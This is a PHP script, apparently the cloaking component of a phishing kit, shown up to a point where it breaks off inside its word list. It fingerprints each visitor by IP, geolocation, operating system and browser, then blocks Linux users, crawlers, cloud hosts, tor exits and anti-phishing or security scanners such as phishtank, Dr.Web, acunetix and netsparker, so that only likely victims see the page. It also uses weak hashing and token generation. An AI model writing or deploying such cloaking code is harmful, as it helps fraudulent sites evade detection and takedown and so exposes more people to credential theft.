<?php

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function make_hash($str)
{
    return sha1(md5($str));
}

function isLoggedIn()
{
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        return false;
    }

    return true;
}

function getGeo($ip)
{
    if (strlen($ip) > 3) {
        try {
            $cURLConnection = curl_init();
            curl_setopt($cURLConnection, CURLOPT_URL, 'http://ip-api.com/json/' . $ip);
            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($cURLConnection, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($cURLConnection, CURLOPT_TIMEOUT, 5);
            $phoneList = curl_exec($cURLConnection);
            curl_close($cURLConnection);
            $jsonArrayResponse = json_decode($phoneList);
            return $jsonArrayResponse;
        } catch (Exception $e) {
            return false;
        }
    }

    return "";
}


function getIp()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}


function getUserAgent()
{
    return $_SERVER['HTTP_USER_AGENT'];
}


function isMobile()
{
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i', $useragent) || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($useragent, 0, 4));
}

function getOS()
{
    global $user_agent;
    $os_platform    =   "OS desconhecido";
    $os_array       =   array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser        = "Navegador desconhecido";
    $browser_array  = array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Navegador portatil'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function gerarCaracteres($tamanho = 8, $maiusculas = true, $numeros = true)
{
    $lmin = 'abcdefghijklmnopqrstuvwxyz';
    $lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $num = '1234567890';
    $retorno = '';
    $caracteres = '';

    $caracteres .= $lmin;
    if ($maiusculas) $caracteres .= $lmai;
    if ($numeros) $caracteres .= $num;

    $len = strlen($caracteres);
    for ($n = 1; $n <= $tamanho; $n++) {
        $rand = mt_rand(1, $len);
        $retorno .= $caracteres[$rand - 1];
    }
    return $retorno;
}

$hash = gerarCaracteres(150);


function getUserIP()
{
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
		$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
		$_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	} else {
		$ip = $remote;
	}

	return $ip;
}
$ip = getUserIP();
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
// $ip = getIp();
$data = date("d-m-Y-H:i:s");
$userAgent = getUserAgent();
$sistema = getOS();
$navegador = getBrowser();
$dispositivo = isMobile() ? "MOBILE" : "DESKTOP";
$localizacao = getGeo($ip);
$pais = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-";
$estado = isset($localizacao) && isset($localizacao->region) ? $localizacao->region : "-";
$cidade = isset($localizacao) && isset($localizacao->city) ? $localizacao->city : "-";

$bname = 'Unknown';
$platform = 'Unknown';
$version = "";

if (preg_match('/linux/i', $user_agent)) {
	$platform = 'Linux';
} elseif (preg_match('/macintosh|mac os x/i', $user_agent)) {
	$platform = 'Mac';
} elseif (preg_match('/windows|win32/i', $user_agent)) {
	$platform = 'Windows';
}

if (preg_match('/MSIE/i', $user_agent) && !preg_match('/Opera/i', $user_agent)) {
	$bname = 'Internet Explorer';
	$ub = "MSIE";
} elseif (preg_match('/Firefox/i', $user_agent)) {
	$bname = 'Mozilla Firefox';
	$ub = "Firefox";
} elseif (preg_match('/Chrome/i', $user_agent)) {
	$bname = 'Google Chrome';
	$ub = "Chrome";
} elseif (preg_match('/AppleWebKit/i', $user_agent)) {
	$bname = 'AppleWebKit';
	$ub = "Opera";
} elseif (preg_match('/Safari/i', $user_agent)) {
	$bname = 'Apple Safari';
	$ub = "Safari";
} elseif (preg_match('/Netscape/i', $user_agent)) {
	$bname = 'Netscape';
	$ub = "Netscape";
}

$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) . ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $user_agent, $matches)) {
}
$i = count($matches['browser']);
if ($i != 1) {
	if (strripos($user_agent, "Version") < strripos($user_agent, $ub)) {
		$version = $matches['version'][0];
	} else {
		$version = $matches['version'][1];
	}
} else {
	$version = $matches['version'][0];
}
if ($version == null || $version == "") {
	$version = "?";
}

$Browser = array(
	'userAgent' => $user_agent,
	'name'      => $bname,
	'version'   => $version,
	'platform'  => $platform,
	'pattern'    => $pattern
);

$navegador = $Browser['name'];
$sistemaAcesso = getOS();
$versao = substr($Browser['version'], 0, 3);

// if ($pais == "Brazil") {
//     $status = "BLOQUEADO";
// }

// $url = "https://blackbox.ipinfo.app/lookup/" . $ip;
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, $url);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
// $resp = curl_exec($ch);
// curl_close($ch);
// $result = $resp;
// if ($result == "Y") {
//     $status = "BLOQUEADO";
// }

// if ($navegador == "Google Chrome" && $versao < "94") {
// 	$status = "BLOQUEADO";
// }
if ($sistemaAcesso == "OS desconhecido") {
	$status = "BLOQUEADO";
}
if ($sistemaAcesso == "Ubuntu" || $sistemaAcesso == "Linux") {
	$status = "BLOQUEADO";
}
if (preg_match('/Googlebot\/|Googlebot-Mobile|Googlebot-Image|Googlebot-News|Googlebot-Video|AdsBot-Google([^-]|$)|AdsBot-Google-Mobile|Feedfetcher-Google|Mediapartners-Google|Mediapartners \(Googlebot\)|APIs-Google|bingbot|Slurp|[wW]get|LinkedInBot|Python-urllib|python-requests|libwww-perl|httpunit|nutch|Go-http-client|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|BIGLOTRON|Teoma|convera|seekbot|Gigabot|Gigablast|exabot|ia_archiver|GingerCrawler|webmon |HTTrack|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|findlink|msrbot|panscient|yacybot|AISearchBot|ips-agent|tagoobot|MJ12bot|woriobot|yanga|buzzbot|mlbot|YandexBot|YandexImages|YandexAccessibilityBot|YandexMobileBot|purebot|Linguee Bot|CyberPatrol|voilabot|Baiduspider|citeseerxbot|spbot|twengabot|postrank|TurnitinBot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|Ahrefs(Bot|SiteAudit)|fuelbot|CrunchBot|IndeedBot|mappydata|woobot|ZoominfoBot|PrivacyAwareBot|Multiviewbot|SWIMGBot|Grobbot|eright|Apercite|semanticbot|Aboundex|domaincrawler|wbsearchbot|summify|CCBot|edisterbot|seznambot|ec2linkfinder|gslfbot|aiHitBot|intelium_bot|facebookexternalhit|Yeti|RetrevoPageAnalyzer|lb-spider|Sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|OrangeBot\/|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|S[eE][mM]rushBot|yoozBot|lipperhey|Y!J|Domain Re-Animator Bot|AddThis|Screaming Frog SEO Spider|MetaURI|Scrapy|Livelap[bB]ot|OpenHoseBot|CapsuleChecker|collection@infegy.com|IstellaBot|DeuSu\/|betaBot|Cliqzbot\/|MojeekBot\/|netEstate NE Crawler|SafeSearch microdata crawler|Gluten Free Crawler\/|Sonic|Sysomos|Trove|deadlinkchecker|Slack-ImgProxy|Embedly|RankActiveLinkBot|iskanie|SafeDNSBot|SkypeUriPreview|Veoozbot|Slackbot|redditbot|datagnionbot|Google-Adwords-Instant|adbeat_bot|WhatsApp|contxbot|pinterest.com.bot|electricmonk|GarlikCrawler|BingPreview\/|vebidoobot|FemtosearchBot|Yahoo Link Preview|MetaJobBot|DomainStatsBot|mindUpBot|Daum\/|Jugendschutzprogramm-Crawler|Xenu Link Sleuth|Pcore-HTTP|moatbot|KosmioBot|pingdom|AppInsights|PhantomJS|Gowikibot|PiplBot|Discordbot|TelegramBot|Jetslide|newsharecounts|James BOT|Bark[rR]owler|TinEye|SocialRankIOBot|trendictionbot|Ocarinabot|epicbot|Primalbot|DuckDuckGo-Favicons-Bot|GnowitNewsbot|Leikibot|LinkArchiver|YaK\/|PaperLiBot|Digg Deeper|dcrawl|Snacktory|AndersPinkBot|Fyrebot|EveryoneSocialBot|Mediatoolkitbot|Luminator-robots|ExtLinksBot|SurveyBot|NING\/|okhttp|Nuzzel|omgili|PocketParser|YisouSpider|um-LN|ToutiaoSpider|MuckRack|Jamie\'s Spider|AHC\/|NetcraftSurveyAgent|Laserlikebot|^Apache-HttpClient|AppEngine-Google|Jetty|Upflow|Thinklab|Traackr.com|Twurly|Mastodon|http_get|DnyzBot|botify|007ac9 Crawler|BehloolBot|BrandVerity|check_http|BDCbot|ZumBot|EZID|ICC-Crawler|ArchiveBot|^LCC |filterdb.iss.net\/crawler|BLP_bbot|BomboraBot|Buck\/|Companybook-Crawler|Genieo|magpie-crawler|MeltwaterNews|Moreover|newspaper\/|ScoutJet|(^| )sentry\/|StorygizeBot|UptimeRobot|OutclicksBot|seoscanners|Hatena|Google Web Preview|MauiBot|AlphaBot|SBL-BOT|IAS crawler|adscanner|Netvibes|acapbot|Baidu-YunGuanCe|bitlybot|blogmuraBot|Bot.AraTurka.com|bot-pge.chlooe.com|BoxcarBot|BTWebClient|ContextAd Bot|Digincore bot|Disqus|Feedly|Fetch\/|Fever|Flamingo_SearchEngine|FlipboardProxy|g2reader-bot|G2 Web Services|imrbot|K7MLWCBot|Kemvibot|Landau-Media-Spider|linkapediabot|vkShare|Siteimprove.com|BLEXBot\/|DareBoost|ZuperlistBot\/|Miniflux\/|Feedspot|Diffbot\/|SEOkicks|tracemyfile|Nimbostratus-Bot|zgrab|PR-CY.RU|AdsTxtCrawler|Datafeedwatch|Zabbix|TangibleeBot|google-xrawler|axios|Amazon CloudFront|Pulsepoint|CloudFlare-AlwaysOnline|Google-Structured-Data-Testing-Tool|WordupInfoSearch|WebDataStats|HttpUrlConnection|Seekport Crawler|ZoomBot|VelenPublicWebCrawler|MoodleBot|jpg-newsbot|outbrain|W3C_Validator|Validator\.nu|W3C-checklink|W3C-mobileOK|W3C_I18n-Checker|FeedValidator|W3C_CSS_Validator|W3C_Unicorn|Google-PhysicalWeb|Blackboard|ICBot\/|BazQux|Twingly|Rivva|Experibot|awesomecrawler|Dataprovider.com|GroupHigh\/|theoldreader.com|AnyEvent|Uptimebot\.org|Nmap Scripting Engine|2ip.ru|Clickagy|Caliperbot|MBCrawler|online-webceo-bot|B2B Bot|AddSearchBot|Google Favicon|HubSpot|Chrome-Lighthouse|HeadlessChrome|CheckMarkNetwork\/|www\.uptime\.com|Streamline3Bot\/|serpstatbot\/|MixnodeCache\/|^curl|SimpleScraper|RSSingBot|Jooblebot|fedoraplanet|Friendica|NextCloud|Tiny Tiny RSS|RegionStuttgartBot|Bytespider|Datanyze|Google-Site-Verification/', $_SERVER['HTTP_USER_AGENT'])) {
	$status = "BLOQUEADO";
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words =
	array(
		"Python/3.8 aiohttp/3.8.3",
		"Python/3.8",
		"aiohttp/3.8.3",
		"bot",
		"above",
		"google",
		"softlayer",
		"amazonaws",
		"cyveillance",
		"phishtank",
		"dreamhost",
		"netpilot",
		"calyxinstitute",
		"tor-exit",
		"apache-httpclient",
		"lssrocketcrawler",
		"crawler",
		"urlredirectresolver",
		"jetbrains",
		"spam",
		"windows 95",
		"windows 98",
		"acunetix",
		"netsparker",
		"007ac9",
		"008",
		"192.comagent",
		"200pleasebot",
		"360spider",
		"4seohuntbot",
		"50.nu",
		"a6-indexer",
		"admantx",
		"amznkassocbot",
		"aboundexbot",
		"aboutusbot",
		"abrave spider",
		"accelobot",
		"acoonbot",
		"addthis.com",
		"adsbot-google",
		"ahrefsbot",
		"alexabot",
		"amagit.com",
		"analytics",
		"antbot",
		"apercite",
		"aportworm",
		"EBAY",
		"CL0NA",
		"jabber",
		"ebay",
		"arabot",
		"hotmail!",
		"msn!",
		"outlook!",
		"outlook",
		"msn",
		"hotmail",
		"abot",
		"dbot",
		"ebot",
		"hbot",
		"kbot",
		"lbot",
		"mbot",
		"nbot",
		"obot",
		"pbot",
		"rbot",
		"sbot",
		"tbot",
		"vbot",
		"ybot",
		"zbot",
		"bot.",
		"bot/",
		"_bot",
		".bot",
		"/bot",
		"-bot",
		":bot",
		"(bot",
		"crawl",
		"slurp",
		"spider",
		"seek",
		"accoona",
		"acoon",
		"adressendeutschland",
		"ah-ha.com",
		"ahoy",
		"altavista",
		"ananzi",
		"anthill",
		"appie",
		"arachnophilia",
		"arale",
		"araneo",
		"aranha",
		"architext",
		"aretha",
		"arks",
		"asterias",
		"atlocal",
		"atn",
		"atomz",
		"augurfind",
		"backrub",
		"bannana_bot",
		"baypup",
		"bdfetch",
		"big brother",
		"biglotron",
		"bjaaland",
		"blackwidow",
		"blaiz",
		"blog",
		"blo.",
		"bloodhound",
		"boitho",
		"booch",
		"bradley",
		"butterfly",
		"calif",
		"cassandra",
		"ccubee",
		"cfetch",
		"charlotte",
		"churl",
		"cienciaficcion",
		"cmc",
		"collective",
		"comagent",
		"combine",
		"computingsite",
		"csci",
		"curl",
		"cusco",
		"daumoa",
		"deepindex",
		"delorie",
		"depspid",
		"deweb",
		"echo blinde kuh",
		"digger",
		"ditto",
		"dmoz",
		"docomo",
		"download express",
		"dtaagent",
		"dwcp",
		"ebiness",
		"ebingbong",
		"e-collector",
		"ejupiter",
		"emacs-w3 search engine",
		"esther",
		"evliya celebi",
		"ezresult",
		"falcon",
		"felix ide",
		"ferret",
		"fetchrover",
		"fido",
		"findlinks",
		"fireball",
		"fish search",
		"fouineur",
		"funnelweb",
		"gazz",
		"gcreep",
		"genieknows",
		"getterroboplus",
		"geturl",
		"glx",
		"goforit",
		"golem",
		"grabber",
		"grapnel",
		"gralon",
		"griffon",
		"gromit",
		"grub",
		"gulliver",
		"hamahakki",
		"harvest",
		"havindex",
		"helix",
		"heritrix",
		"hku www octopus",
		"homerweb",
		"htdig",
		"html index",
		"html_analyzer",
		"htmlgobble",
		"hubater",
		"hyper-decontextualizer",
		"ia_archiver",
		"ibm_planetwide",
		"ichiro",
		"iconsurf",
		"iltrovatore",
		"image.kapsi.net",
		"imagelock",
		"incywincy",
		"indexer",
		"infobee",
		"informant",
		"ingrid",
		"inktomisearch.com",
		"inspector web",
		"intelliagent",
		"internet shinchakubin",
		"ip3000",
		"iron33",
		"israeli-search",
		"ivia",
		"jack",
		"jakarta",
		"javabee",
		"jetbot",
		"jumpstation",
		"katipo",
		"kdd-explorer",
		"kilroy",
		"knowledge",
		"kototoi",
		"kretrieve",
		"labelgrabber",
		"lachesis",
		"larbin",
		"legs",
		"libwww",
		"linkalarm",
		"link validator",
		"linkscan",
		"lockon",
		"lwp",
		"lycos",
		"magpie",
		"mantraagent",
		"mapoftheinternet",
		"marvin/",
		"mattie",
		"mediafox",
		"mediapartners",
		"mercator",
		"merzscope",
		"microsoft url control",
		"minirank",
		"miva",
		"mj12",
		"mnogosearch",
		"moget",
		"monster",
		"moose",
		"motor",
		"multitext",
		"muncher",
		"muscatferret",
		"mwd.search",
		"myweb",
		"najdi",
		"nameprotect",
		"nationaldirectory",
		"nazilla",
		"ncsa beta",
		"nec-meshexplorer",
		"nederland.zoek",
		"netcarta webmap engine",
		"netmechanic",
		"netresearchserver",
		"netscoop",
		"newscan-online",
		"nhse",
		"nokia6682/",
		"nomad",
		"noyona",
		"nutch",
		"nzexplorer",
		"objectssearch",
		"occam",
		"omni",
		"open text",
		"openfind",
		"openintelligencedata",
		"orb search",
		"osis-project",
		"pack rat",
		"pageboy",
		"pagebull",
		"page_verifier",
		"panscient",
		"parasite",
		"partnersite",
		"patric",
		"pear.",
		"pegasus",
		"peregrinator",
		"pgp key agent",
		"phantom",
		"phpdig",
		"picosearch",
		"piltdownman",
		"pimptrain",
		"pinpoint",
		"pioneer",
		"piranha",
		"plumtreewebaccessor",
		"pogodak",
		"poirot",
		"pompos",
		"poppelsdorf",
		"poppi",
		"popular iconoclast",
		"psycheclone",
		"publisher",
		"python",
		"rambler",
		"raven search",
		"roach",
		"road runner",
		"roadhouse",
		"robbie",
		"robofox",
		"robozilla",
		"rules",
		"salty",
		"sbider",
		"scooter",
		"scoutjet",
		"scrubby",
		"search.",
		"searchprocess",
		"semanticdiscovery",
		"senrigan",
		"sg-scout",
		"shai'hulud",
		"shark",
		"shopwiki",
		"sidewinder",
		"sift",
		"silk",
		"simmany",
		"site searcher",
		"site valet",
		"sitetech-rover",
		"skymob.com",
		"sleek",
		"smartwit",
		"sna-",
		"snappy",
		"snooper",
		"sohu",
		"speedfind",
		"sphere",
		"sphider",
		"spinner",
		"spyder",
		"steeler/",
		"suke",
		"suntek",
		"supersnooper",
		"surfnomore",
		"sven",
		"sygol",
		"szukacz",
		"tach black widow",
		"tarantula",
		"templeton",
		"/teoma",
		"t-h-u-n-d-e-r-s-t-o-n-e",
		"theophrastus",
		"titan",
		"titin",
		"tkwww",
		"toutatis",
		"t-rex",
		"tutorgig",
		"twiceler",
		"twisted",
		"ucsd",
		"udmsearch",
		"url check",
		"updated",
		"vagabondo",
		"valkyrie",
		"verticrawl",
		"victoria",
		"vision-search",
		"volcano",
		"voyager/",
		"voyager-hc",
		"w3c_validator",
		"w3m2",
		"w3mir",
		"walker",
		"wallpaper",
		"wanderer",
		"wauuu",
		"wavefire",
		"web core",
		"web hopper",
		"web wombat",
		"webbandit",
		"webcatcher",
		"webcopy",
		"webfoot",
		"weblayers",
		"weblinker",
		"weblog monitor",
		"webmirror",
		"webmonkey",
		"webquest",
		"webreaper",
		"websitepulse",
		"websnarf",
		"webstolperer",
		"webvac",
		"webwalk",
		"webwatch",
		"webwombat",
		"webzinger",
		"wget",
		"whizbang",
		"whowhere",
		"wild ferret",
		"worldlight",
		"wwwc",
		"wwwster",
		"xenu",
		"xget",
		"xift",
		"xirq",
		"yandex",
		"yanga",
		"yeti",
		"yodao",
		"zao/",
		"zippp",
		"zyborg",
		"drweb",
		"Dr.Web",
		"hostinger",
		"scanurl",
		"above",
		"google",
		"facebook",
		"softlayer",
		"amazonaws",
		"cyveillance",
		"phishtank",
		"dreamhost",
		"netpilot",
		"calyxinstitute",
		"tor-exit",
		"bot",
		"above",
		"google",
		"softlayer",
		"amazonaws",
		"cyveillance",
		"compatible",
		"facebook",
		"phishtank",
		"dreamhost",
		"netpilot",
		"calyxinstitute",
		"tor-exit",
		"apache-httpclient",
		"lssrocketcrawler",
		"Trident",
		"X11",
		"Macintosh",
		"crawler",
		"urlredirectresolver",
		"jetbrains",
		"spam",
		"windows 95",
		"windows 98",
		"acunetix",
		"netsparker",
		"google",
		"007ac9",
		"008",
		"192.comagent",
		"200pleasebot",
		"360spider",
		"4seohuntbot",
		"50.nu",
		"a6-indexer",
		"admantx",
		"amznkassocbot",
		"aboundexbot",
		"aboutusbot",
		"abrave spider",
		"accelobot",
		"acoonbot",
		"addthis.com",
		"adsbot-google",
		"ahrefsbot",
		"alexabot",
		"amagit.com",
		"analytics",
		"antbot",
		"apercite",
		"aportworm",
		"arabot",
		"crawl",
		"slurp",
		"spider",
		"seek",
		"accoona",
		"acoon",
		"adressendeutschland",
		"ah-ha.com",
		"ahoy",
		"altavista",
		"ananzi",
		"anthill",
		"appie",
		"arachnophilia",
		"arale",
		"araneo",
		"aranha",
		"architext",
		"aretha",
		"arks",
		"asterias",
		"atlocal",
		"atn",
		"atomz",
		"augurfind",
		"backrub",
		"bannana_bot",
		"baypup",
		"bdfetch",
		"big brother",
		"biglotron",
		"bjaaland",
		"blackwidow",
		"blaiz",
		"blog",
		"blo.",
		"bloodhound",
		"boitho",
		"booch",
		"bradley",
		"butterfly",
		"calif",
		"cassandra",
		"ccubee",
		"cfetch",
		"charlotte",
		"churl",
		"cienciaficcion",
		"cmc",
		"collective",
		"comagent",
		"combine",
		"computingsite",
		"csci",
		"curl",
		"cusco",
		"daumoa",
		"deepindex",
		"delorie",
		"depspid",
		"deweb",
		"die blinde kuh",
		"digger",
		"ditto",
		"dmoz",
		"docomo",
		"download express",
		"dtaagent",
		"dwcp",
		"ebiness",
		"ebingbong",
		"e-collector",
		"ejupiter",
		"emacs-w3 search engine",
		"esther",
		"evliya celebi",
		"ezresult",
		"falcon",
		"felix ide",
		"ferret",
		"fetchrover",
		"fido",
		"findlinks",
		"fireball",
		"fish search",
		"fouineur",
		"funnelweb",
		"gazz",
		"gcreep",
		"genieknows",
		"getterroboplus",
		"geturl",
		"glx",
		"goforit",
		"golem",
		"grabber",
		"grapnel",
		"gralon",
		"griffon",
		"gromit",
		"grub",
		"gulliver",
		"hamahakki",
		"harvest",
		"havindex",
		"helix",
		"heritrix",
		"hku www octopus",
		"homerweb",
		"htdig",
		"html index",
		"html_analyzer",
		"htmlgobble",
		"hubater",
		"hyper-decontextualizer",
		"ia_archiver",
		"ibm_planetwide",
		"ichiro",
		"iconsurf",
		"iltrovatore",
		"image.kapsi.net",
		"imagelock",
		"incywincy",
		"indexer",
		"infobee",
		"informant",
		"ingrid",
		"inktomisearch.com",
		"inspector web",
		"intelliagent",
		"internet shinchakubin",
		"ip3000",
		"iron33",
		"israeli-search",
		"ivia",
		"jack",
		"jakarta",
		"javabee",
		"jetbot",
		"jumpstation",
		"katipo",
		"kdd-explorer",
		"kilroy",
		"knowledge",
		"kototoi",
		"kretrieve",
		"labelgrabber",
		"lachesis",
		"larbin",
		"legs",
		"libwww",
		"linkalarm",
		"link validator",
		"linkscan",
		"lockon",
		"lwp",
		"lycos",
		"magpie",
		"mantraagent",
		"mapoftheinternet",
		"marvin/",
		"mattie",
		"mediafox",
		"mediapartners",
		"mercator",
		"merzscope",
		"microsoft url control",
		"minirank",
		"miva",
		"mj12",
		"mnogosearch",
		"moget",
		"monster",
		"moose",
		"motor",
		"multitext",
		"muncher",
		"muscatferret",
		"mwd.search",
		"myweb",
		"najdi",
		"nameprotect",
		"nationaldirectory",
		"nazilla",
		"ncsa beta",
		"nec-meshexplorer",
		"nederland.zoek",
		"netcarta webmap engine",
		"netmechanic",
		"netresearchserver",
		"netscoop",
		"newscan-online",
		"nhse",
		"nokia6682/",
		"nomad",
		"noyona",
		"nutch",
		"nzexplorer",
		"objectssearch",
		"occam",
		"omni",
		"open text",
		"openfind",
		"openintelligencedata",
		"orb search",
		"osis-project",
		"pack rat",
		"pageboy",
		"pagebull",
		"page_verifier",
		"panscient",
		"parasite",
		"partnersite",
		"patric",
		"pear.",
		"pegasus",
		"peregrinator",
		"pgp key agent",
		"phantom",
		"phpdig",
		"picosearch",
		"piltdownman",
		"pimptrain",
		"pinpoint",
		"pioneer",
		"piranha",
		"plumtreewebaccessor",
		"pogodak",
		"poirot",
		"pompos",
		"poppelsdorf",
		"poppi",
		"popular iconoclast",
		"psycheclone",
		"publisher",
		"python",
		"rambler",
		"raven search",
		"roach",
		"road runner",
		"roadhouse",
		"robbie",
		"robofox",
		"robozilla",
		"rules",
		"salty",
		"sbider",
		"scooter",
		"scoutjet",
		"scrubby",
		"search.",
		"searchprocess",
		"semanticdiscovery",
		"senrigan",
		"sg-scout",
		"shai'hulud",
		"shark",
		"shopwiki",
		"sidewinder",
		"sift",
		"silk",
		"simmany",
		"site searcher",
		"site valet",
		"sitetech-rover",
